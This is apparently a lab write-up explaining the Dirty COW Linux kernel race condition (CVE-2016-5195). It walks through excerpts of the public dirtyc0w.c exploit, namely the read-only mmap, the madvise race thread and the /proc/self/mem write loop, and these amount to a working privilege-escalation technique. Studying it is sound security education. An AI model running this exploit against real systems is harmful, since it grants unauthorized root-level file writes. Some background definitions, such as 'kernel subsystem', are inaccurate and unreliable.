# thm: Dirty cow kernel exploit race condition CVE-2016-5195

## Background

The vulnerability “Dirty Cow” came from the “dirty” bit and copy-on-write(COW). Dirty Cow is a vulnerability that occurs in the kernel’s memory subsystem so as to race condition. A race condition vulnerability was found in the way the Linux kernel’s memory subsystem handled the copy-on-write breakage of private read-only memory mappings. It deliberately creates an error during copy-on-write by repeating the processes and it tricks the kernel into actually writing to the underlying file.

This vulnerability allows privilege escalation by modifying critical system files such as /etc/passwd or the sudo binary.

- Kernel subsystem: The Kernel subsystem is responsible for fairly distributing the CPU time among all the processes running on the system simultaneously.

- Race condition: Race conditions occur when two computer program processes, or threads, attempt to access the same resource at the same time and cause problems in the system. Race conditions are considered a common issue for multithreaded applications.

- Overhead: CPU overhead measures the amount of work a computer’s central processing unit can perform and the percentage of that capacity that’s used by individual computing tasks.

- Copy-on-write: Copy On Write (CoW) is a method in which multiple processes continue to share the same physical memory until a write actually occurs.

- Dirty bit: A dirty bit is a binary value used by computer systems to track whether a specific unit of data, such as a cache line or a memory page, has been modified.

## Analysis

https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c

### Step1: open the root file in read only mode.
```
f=open(argv[1],O_RDONLY);
fstat(f,&st);
name=argv[1];
```

### Step2: mmap maps a file into memory. copy-on-write

Normally, copy-on-write (COW) occurs when a process attempts to write to memory that has been mapped as read-only. The write operation is performed on a private copy of the memory rather than the original segment. As a result, modifications are not visible to other processes mapping the same file, nor are they propagated to the underlying file. The specification also leaves undefined whether changes made to the file after an mmap() call are reflected in the mapped region.
```
map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0); 
printf("mmap %zx\n\n",(uintptr_t) map);
```
The mapping must be created with MAP_PRIVATE in order to enable copy-on-write behavior. The PROT_READ flag indicates that the mapped file is readable only. In this configuration, a private copy-on-write mapping is established.

### Step3: Start two threads to create copy-on-write race conditions.
```
pthread_create(&pth1,NULL,madviseThread,argv[1]);
pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
```
Both threads will run in parallel. DirtyCow is a race condition vulnerability. It means certain events have to occur in a specific order, that are unlikely to happen under normal conditions.

### Step 3.1: Madvise Thread

First thread uses the syscall madvise(). The madvise system call is used to give advice or directions to the kernel about the address range.
```
void *madviseThread(void *arg)
{
 char *str;
 str=(char*)arg;
 int i,c=0;
 for(i=0;i<100000000;i++)
 {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
 c+=madvise(map,100,MADV_DONTNEED);
 }
 printf("madvise %d\n\n",c);
}
```
First 100 byte is MADV_DONTNEED which means that it does not expect access in the near future. Subsequent accesses of pages in the range will succeed, but will result in either repopulating the memory contents from the up-to-date contents of the underlying mapped file.

### Step 3.2: write to proc/self/mem thread (R/O to R/W by proc/self/mem)
```
void *procselfmemThread(void *arg)
{
 char *str;
 str=(char*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
> The in the wild exploit we are aware of doesn't work on Red Hat
> Enterprise Linux 5 and 6 out of the box because on one side of
> the race it writes to /proc/self/mem, but /proc/self/mem is not
> writable on Red Hat Enterprise Linux 5 and 6.
*/
 int f=open("/proc/self/mem",O_RDWR);
 int i,c=0;
 for(i=0;i<100000000;i++) {
/*
You have to reset the file pointer to the memory position.
*/
 lseek(f,(uintptr_t) map,SEEK_SET);
 c+=write(f,str,strlen(str));
 }
 printf("procselfmem %d\n\n", c);
}
```

First, mmap R/O file to memory by MAP_PRIVATE -> R/O map created. And next, open /proc/self/mem file by open() as if it is a file -> R/W file opened.

By accessing the virtual address offset through /proc/self/mem with read/write permissions, it becomes possible to issue write operations to a read-only disk mapping. In such cases, copy-on-write is triggered, and the write is applied to the private copy rather than the underlying file on disk. At this stage, no direct security impact arises.

- /proc : the information about the processes
- /proc/self : the current process
- /proc/self/mem : the memory (r/w permission)

Second, thread proc/self/mem thread opens the file /proc/self/mem and writes to this file in a loop. This is a thread that repeatedly sends write requests for the R/O map to the kernel through /proc/self/mem.

When copy-on-write is triggered, the kernel verifies that the write permission is valid and locates the corresponding page. At this stage, the private copy of the page can be discarded using `madvise(MADV_DONTNEED)`. Writing to the copied mapped memory marks the page as dirty, but the dirty page is not actually written back to the underlying file.

So this madvise call causes the throwing away of this memory. This means it is not any of the memory caches anymore. The page is searched again, it will create a edgecase that usually does not occur since it determined that write permission has been secured earlier, tricking the kernel into actually writing to the “actual” map page and write permission is not checked.

If a race condition occurs during this sequence, arbitrary data can be written to a read-only file. Each write attempt may coincide with the private copy being discarded, forcing the kernel to reload a fresh copy from the underlying file, which can then be modified.

The patch introduces a check to ensure that copy-on-write operations have completed before allowing further writes, preventing this condition from being exploited.
https://www.youtube.com/watch?v=kEsshExn7aE&ab_channel=LiveOverflow
